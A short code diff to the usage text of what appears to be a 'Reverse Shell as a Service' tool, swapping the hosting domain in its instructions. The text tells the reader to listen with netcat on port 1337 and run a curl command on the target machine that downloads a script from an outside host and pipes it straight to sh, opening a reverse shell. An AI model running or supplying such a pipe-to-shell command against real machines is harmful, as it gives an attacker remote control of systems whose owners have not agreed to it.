@@ -7,7 +7,7 @@ const usage = `# Reverse Shell as a Service
 #      nc -l 1337
 #
 # 2. On the target machine:
-#      curl https://shell.now.sh/yourip:1337 | sh
+#      curl http://zyx.iami.xyz/yourip:1337 | sh
 #
 # 3. Don't be a dick`;
 
